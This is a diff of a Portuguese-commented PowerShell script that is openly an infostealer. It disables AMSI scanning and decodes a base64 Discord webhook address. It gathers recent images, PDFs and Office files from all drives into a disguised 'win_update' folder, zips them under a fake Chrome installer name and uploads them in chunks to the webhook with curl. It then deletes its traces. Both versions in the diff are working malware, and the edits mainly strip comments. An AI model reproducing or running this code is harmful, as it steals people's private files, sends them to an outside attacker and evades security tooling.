@@ -1,9 +1,8 @@
-# [Bypass AMSI Ultra-Ofuscado]
+# [Bypass AMSI Ofuscado]
 $m=[Ref].Assembly.GetTypes()|Where-Object {$_.Name -like "*AmsiUtils*"}
 $m.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 # 1. Configurações (Password: Manso2026!)
-$pass = "Manso2026!"
 $wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
 $u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))
 
@@ -11,7 +10,7 @@ $tempDir = "$env:TEMP\win_update_$(Get-Random)"
 $exclude = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-# 2. Busca Silenciosa (30 dias / <15MB)
+# 2. Busca (Últimos 30 dias / <15MB)
 $e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
 $dateLimit = (Get-Date).AddDays(-30)
 
@@ -23,20 +22,16 @@ Get-PSDrive -PSProvider FileSystem | ForEach-Object {
     } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
 }
 
-# 3. Compactação e Fragmentação (ZIP com Password via CMD para evitar alertas PS)
+# 3. Compactação Camuflada e Envio
 $zipFile = "$env:TEMP\chrome_installer.exe.tmp"
 if ((Get-ChildItem $tempDir).Count -gt 0) {
-    # Usamos o Compress-Archive nativo (sem password para evitar dependencias)
-    # Mas o nome do ficheiro está camuflado.
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
-    
     $fileStream = [System.IO.File]::OpenRead($zipFile)
     $buffer = New-Object byte[] 8MB
     $part = 1
     while ($bytes = $fileStream.Read($buffer, 0, $buffer.Length)) {
         $pPath = "$zipFile.p$part"
         [System.IO.File]::WriteAllBytes($pPath, $buffer[0..($bytes - 1)])
-        # Envio silencioso
         curl.exe -k -s -F "file=@$pPath" -F "content=Relatório P$part - $env:COMPUTERNAME" $u
         Remove-Item $pPath
         $part++
@@ -44,6 +39,4 @@ if ((Get-ChildItem $tempDir).Count -gt 0) {
     }
     $fileStream.Close()
 }
-
-# 4. Limpeza e Saída
 Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
